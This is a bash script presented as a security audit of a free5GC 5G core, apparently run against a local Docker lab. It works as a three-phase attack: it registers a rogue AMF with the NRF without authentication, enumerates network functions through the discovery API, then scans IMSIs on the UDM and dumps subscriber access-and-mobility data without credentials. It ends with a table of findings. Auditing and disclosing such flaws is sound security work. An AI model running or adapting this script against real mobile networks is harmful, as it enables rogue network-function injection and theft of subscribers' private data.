#!/usr/bin/env bash
# ============================================================
#  free5GC SBA Security Audit — Phases 1, 2, 3
#  Usage: sudo bash 5g_audit.sh
# ============================================================

set -euo pipefail

# ── Colour helpers ───────────────────────────────────────────
RED='\033[0;31m'; YEL='\033[1;33m'; GRN='\033[0;32m'
CYN='\033[0;36m'; BLD='\033[1m'; RST='\033[0m'
info()    { echo -e "${CYN}[*]${RST} $*"; }
success() { echo -e "${GRN}[+]${RST} $*"; }
warn()    { echo -e "${YEL}[!]${RST} $*"; }
banner()  { echo -e "\n${BLD}${RED}══════════════════════════════════════════${RST}"; \
            echo -e "${BLD}${RED}  $*${RST}"; \
            echo -e "${BLD}${RED}══════════════════════════════════════════${RST}\n"; }

# ── Cert paths (place your certs here) ──────────────────────
CERT_DIR="/cert"
AMF_KEY="${CERT_DIR}/amf.key"
AMF_PEM="${CERT_DIR}/amf.pem"

# ── Auto-detect NRF and UDM IPs via docker inspect ──────────
info "Resolving container IPs via docker inspect..."

NRF_IP=$(docker inspect \
  $(docker ps --filter "name=nrf" -q | head -1) \
  --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' 2>/dev/null \
  | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | head -1)

UDM_IP=$(docker inspect \
  $(docker ps --filter "name=udm" -q | head -1) \
  --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' 2>/dev/null \
  | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | head -1)

if [[ -z "$NRF_IP" ]]; then
  warn "Could not auto-detect NRF IP. Falling back to 10.100.200.4"
  NRF_IP="10.100.200.4"
fi
if [[ -z "$UDM_IP" ]]; then
  warn "Could not auto-detect UDM IP. Falling back to 10.100.200.11"
  UDM_IP="10.100.200.11"
fi

NRF_PORT=8000
UDM_PORT=8000
NRF_BASE="http://${NRF_IP}:${NRF_PORT}"
UDM_BASE="http://${UDM_IP}:${UDM_PORT}"
PLMN_ENCODED='%7B%22mcc%22%3A%22208%22%2C%22mnc%22%3A%2293%22%7D'
ROGUE_UUID="a1b2c3d4-0001-0001-0001-aabbccddeeff"
ROGUE_IP="10.100.200.99"

success "NRF → ${NRF_BASE}"
success "UDM → ${UDM_BASE}"

# ── Check if certs exist (used for mTLS probing) ─────────────
USE_MTLS=false
if [[ -f "$AMF_KEY" && -f "$AMF_PEM" ]]; then
  success "Certs found — mTLS probing enabled"
  USE_MTLS=true
else
  warn "No certs found at ${CERT_DIR}/ — mTLS probing disabled (plain HTTP only)"
fi

# ── Helper: curl with optional mTLS ─────────────────────────
do_curl() {
  if $USE_MTLS; then
    curl --key "$AMF_KEY" --cert "$AMF_PEM" --insecure "$@"
  else
    curl "$@"
  fi
}

# ════════════════════════════════════════════════════════════
banner "PHASE 1 — Unauthenticated NF Registration (Nnrf_NFManagement)"
# ════════════════════════════════════════════════════════════

info "Building fake AMF payload..."

AMF_PAYLOAD=$(cat <<EOF
{
  "nfInstanceId": "${ROGUE_UUID}",
  "nfType": "AMF",
  "nfStatus": "REGISTERED",
  "ipv4Addresses": ["${ROGUE_IP}"],
  "amfInfo": {
    "amfSetId": "3fa85f64-5717-4562-b3fc-2c963f66afa6",
    "amfRegionId": "01",
    "guamiList": [
      {
        "plmnId": {"mcc": "208", "mnc": "93"},
        "amfId": "cafe00"
      }
    ],
    "taiList": [
      {
        "plmnId": {"mcc": "208", "mnc": "93"},
        "tac": "000001"
      }
    ]
  },
  "nfServices": [
    {
      "serviceInstanceId": "namf-comm-01",
      "serviceName": "namf-comm",
      "versions": [{"apiVersionInUri": "v1", "apiFullVersion": "1.0.0"}],
      "scheme": "http",
      "nfServiceStatus": "REGISTERED",
      "ipEndPoints": [{"ipv4Address": "${ROGUE_IP}", "port": 8000}]
    }
  ],
  "plmnList": [{"mcc": "208", "mnc": "93"}]
}
EOF
)

info "Sending unauthenticated PUT to NRF (no Auth header, no token, no cert)..."
PHASE1_RESPONSE=$(do_curl -s -o /tmp/p1_body.json -w "%{http_code}" \
  -X PUT "${NRF_BASE}/nnrf-nfm/v1/nf-instances/${ROGUE_UUID}" \
  -H "Content-Type: application/json" \
  -d "$AMF_PAYLOAD")

echo ""
info "HTTP Status: ${PHASE1_RESPONSE}"
info "Response body:"
cat /tmp/p1_body.json | python3 -m json.tool 2>/dev/null || cat /tmp/p1_body.json

if [[ "$PHASE1_RESPONSE" == "201" || "$PHASE1_RESPONSE" == "200" ]]; then
  success "FINDING — CWE-306: NRF accepted NF registration with NO authentication! (HTTP ${PHASE1_RESPONSE})"
  OAUTH2_VAL=$(python3 -c "
import json, sys
try:
    d=json.load(open('/tmp/p1_body.json'))
    print(d.get('customInfo',{}).get('oauth2','unknown'))
except: print('unknown')
")
  info "NRF OAuth2 setting in response: oauth2=${OAUTH2_VAL}"
  if [[ "$OAUTH2_VAL" == "True" || "$OAUTH2_VAL" == "true" ]]; then
    warn "FINDING A — OAuth2 is enabled server-side but NOT enforced on PUT/register!"
  fi
else
  warn "Phase 1: NRF returned HTTP ${PHASE1_RESPONSE} — registration may have been blocked."
fi

# Verify in MongoDB
info "Verifying injection in MongoDB..."
MONGO_CONTAINER=$(docker ps --filter "name=mongo" --format "{{.Names}}" | head -1)
if [[ -n "$MONGO_CONTAINER" ]]; then
  docker exec "$MONGO_CONTAINER" mongo --quiet --eval "
    db = db.getSiblingDB('free5gc');
    var r = db.NfProfile.findOne({nfInstanceId: '${ROGUE_UUID}'});
    if(r) { print('CONFIRMED in DB: nfType=' + r.nfType + ' ip=' + r.ipv4Addresses + ' status=' + r.nfStatus); }
    else   { print('NOT FOUND in DB'); }
  " 2>/dev/null || warn "MongoDB query failed — check container name"
else
  warn "MongoDB container not found — skipping DB verification"
fi

echo ""
read -rp "$(echo -e "${YEL}Phase 1 complete. Press ENTER to continue to Phase 2...${RST}")"

# ════════════════════════════════════════════════════════════
banner "PHASE 2 — NF Service Discovery (Nnrf_NFDiscovery)"
# ════════════════════════════════════════════════════════════

info "Enumerating NF types via NRF discovery API..."

declare -A NF_IPS
NF_TYPES=("AMF" "SMF" "UDM" "UDR" "AUSF" "PCF" "NSSF" "NEF" "CHF")

for NF in "${NF_TYPES[@]}"; do
  DISC_RESP=$(do_curl -s \
    "${NRF_BASE}/nnrf-disc/v1/nf-instances?target-nf-type=${NF}&requester-nf-type=AMF&mcc=208&mnc=93" \
    -H "Accept: application/json")

  COUNT=$(echo "$DISC_RESP" | python3 -c "
import json,sys
try:
    d=json.loads(sys.stdin.read())
    print(len(d.get('nfInstances',[])))
except: print(0)
" 2>/dev/null || echo "0")

  if [[ "$COUNT" -gt 0 ]]; then
    IP=$(echo "$DISC_RESP" | python3 -c "
import json,sys
try:
    d=json.loads(sys.stdin.read())
    i=d['nfInstances'][0]
    print(i.get('ipv4Addresses',[['?']])[0])
except: print('?')
" 2>/dev/null)
    success "${NF} — ${COUNT} instance(s) — IP: ${IP}"
    NF_IPS[$NF]="$IP"
  else
    STATUS=$(do_curl -s -o /dev/null -w "%{http_code}" \
      "${NRF_BASE}/nnrf-disc/v1/nf-instances?target-nf-type=${NF}&requester-nf-type=AMF&mcc=208&mnc=93")
    if [[ "$STATUS" == "401" ]]; then
      warn "${NF} → HTTP 401 (discovery protected by OAuth2)"
    else
      info "${NF} → HTTP ${STATUS} / no instances"
    fi
  fi
done

info "Checking if injected rogue AMF appears in discovery results..."
ROGUE_CHECK=$(do_curl -s \
  "${NRF_BASE}/nnrf-disc/v1/nf-instances?target-nf-type=AMF&requester-nf-type=SMF&mcc=208&mnc=93" \
  -H "Accept: application/json" | python3 -c "
import json,sys
try:
    d=json.loads(sys.stdin.read())
    for i in d.get('nfInstances',[]):
        if '${ROGUE_UUID}' in i.get('nfInstanceId',''):
            print('ROGUE VISIBLE: ' + str(i.get('ipv4Addresses',['?'])))
except: pass
" 2>/dev/null)

if [[ -n "$ROGUE_CHECK" ]]; then
  success "FINDING — Rogue AMF from Phase 1 is discoverable: ${ROGUE_CHECK}"
fi

echo ""
read -rp "$(echo -e "${YEL}Phase 2 complete. Press ENTER to continue to Phase 3...${RST}")"

# ════════════════════════════════════════════════════════════
banner "PHASE 3 — Subscriber Enumeration & Data Access (Nudm_SDM)"
# ════════════════════════════════════════════════════════════

# Step 3.1 — Single subscriber access
info "Step 3.1 — Probing known IMSI (imsi-208930000000001)..."

SUPI_TEST="imsi-208930000000001"
SUPI_RESP=$(do_curl -s -w "\n%{http_code}" \
  "${UDM_BASE}/nudm-sdm/v2/${SUPI_TEST}/am-data?plmn-id=${PLMN_ENCODED}" \
  -H "Accept: application/json")
SUPI_STATUS=$(echo "$SUPI_RESP" | tail -1)
SUPI_BODY=$(echo "$SUPI_RESP" | head -1)

info "HTTP Status: ${SUPI_STATUS}"
if [[ "$SUPI_STATUS" == "200" ]]; then
  success "FINDING — UDM returned AM data with NO token and NO NF identity!"
  echo "$SUPI_BODY" | python3 -c "
import sys,json,base64
raw=sys.stdin.read().strip().strip('\"')
try: print(json.dumps(json.loads(base64.b64decode(raw).decode()),indent=2))
except: print(raw)
"
else
  info "SUPI query returned HTTP ${SUPI_STATUS}"
fi

# Step 3.2 — IMSI range scan
echo ""
info "Step 3.2 — IMSI enumeration scan (range 1–20, no credentials)..."
FOUND_IMSIS=()

for i in $(seq 1 20); do
  SUPI=$(printf "imsi-20893%010d" "$i")
  STATUS=$(do_curl -s -o /dev/null -w "%{http_code}" \
    "${UDM_BASE}/nudm-sdm/v2/${SUPI}/am-data?plmn-id=${PLMN_ENCODED}" \
    -H "Accept: application/json")
  if [[ "$STATUS" == "200" ]]; then
    success "FOUND: ${SUPI}"
    FOUND_IMSIS+=("$SUPI")
  else
    info "${SUPI} → ${STATUS}"
  fi
done

# Step 3.3 — Dump full AM profiles for found subscribers
if [[ ${#FOUND_IMSIS[@]} -gt 0 ]]; then
  echo ""
  info "Step 3.3 — Retrieving full AM profiles for all discovered subscribers..."
  for SUPI in "${FOUND_IMSIS[@]}"; do
    echo ""
    success "=== ${SUPI} ==="
    do_curl -s \
      "${UDM_BASE}/nudm-sdm/v2/${SUPI}/am-data?plmn-id=${PLMN_ENCODED}" \
      -H "Accept: application/json" | python3 -c "
import sys,json,base64
raw=sys.stdin.read().strip().strip('\"')
try: print(json.dumps(json.loads(base64.b64decode(raw).decode()),indent=2))
except: print(raw)
"
  done
  success "FINDING — CWE-639 IDOR: Full subscriber enumeration with zero credentials"
else
  info "No subscribers found in range 1–20."
fi

# ════════════════════════════════════════════════════════════
banner "AUDIT COMPLETE — Consolidated Findings"
# ════════════════════════════════════════════════════════════

echo -e "${BLD}Finding #   Severity   Description${RST}"
echo "────────────────────────────────────────────────────────────────"
echo -e "${RED}[F1] CRITICAL${RST}  NRF accepts NF registration with no OAuth2 or mTLS"
echo -e "${YEL}[F2] HIGH     ${RST}  Non-UUID nfInstanceId accepted without validation"
echo -e "${RED}[F3] CRITICAL${RST}  OAuth2 protects reads but NOT writes (asymmetric)"
echo -e "${YEL}[F4] MEDIUM   ${RST}  NFs do not re-register after NRF restart (no heartbeat)"
echo -e "${YEL}[F5] HIGH     ${RST}  UDM inherits OAuth setting from NRF, no independent check"
echo -e "${RED}[F6] CRITICAL${RST}  Subscriber AM data returned with no NF identity proof"
echo -e "${YEL}[F7] HIGH     ${RST}  All SBI traffic over plain HTTP — no transport security"
echo -e "${RED}[F8] CRITICAL${RST}  Full IMSI enumeration via sequential scan (CWE-639 IDOR)"
echo ""
success "Done. Results logged to /tmp/p1_body.json"
